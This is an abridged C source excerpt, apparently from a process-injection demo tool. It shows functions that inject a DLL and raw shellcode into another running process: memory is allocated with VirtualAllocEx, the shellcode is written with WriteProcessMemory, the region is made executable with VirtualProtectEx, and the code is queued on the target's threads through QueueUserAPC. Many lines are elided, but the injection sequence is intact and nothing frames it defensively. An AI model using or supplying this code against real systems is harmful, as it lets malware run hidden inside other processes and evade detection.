...
DWORD demoQueueUserAPC(PCWSTR pszLibFile, DWORD dwProcessId)
{
		...
		if (bResult)
		{
			if (threadEntry.th32OwnerProcessID == dwProcessId)
			{
				...
				else
				{
					...
					if (!dwResult)
						wprintf(TEXT("[-] Error: Couldn't call QueueUserAPC on thread. Continuing to try other threads...\n"));
					else
	...
	if (!threadId)
		wprintf(TEXT("[-] Error: No threads found in the target process\n"));
...
DWORD demoShellcodeQueueUserAPC(PBYTE pShellcode, SIZE_T szShellcodeLength, DWORD dwProcessId)
{
	...
	PVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, szShellcodeLength, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	...
	DWORD n = WriteProcessMemory(hProcess, pRemoteBuffer, pShellcode, szShellcodeLength, NULL);
	if (n == 0)
	{
		wprintf(TEXT("[-] Error: Could not write any bytes into the PID [%d] address space.\n"), dwProcessId);
		return(1);
	...
	DWORD dummy;
	if (!VirtualProtectEx(hProcess, pRemoteBuffer, szShellcodeLength, PAGE_EXECUTE_READ, &dummy))
	{
		wprintf(TEXT("[-] Error: VirtualProtect - could not change memory to executable\n"));
		return(1);
	}
	...
	while (bResult)
	{
		...
		if (bResult)
		{
			if (threadEntry.th32OwnerProcessID == dwProcessId)
			{
				...
				{
					DWORD dwResult = QueueUserAPC((PAPCFUNC)pRemoteBuffer, hThread, 0);
					if (!dwResult)
						wprintf(TEXT("[-] Error: Couldn't call QueueUserAPC on thread. Continuing to try other threads...\n"));
					else
						wprintf(TEXT("[+] Success: Shellcode injected via QueueUserAPC().\n"));
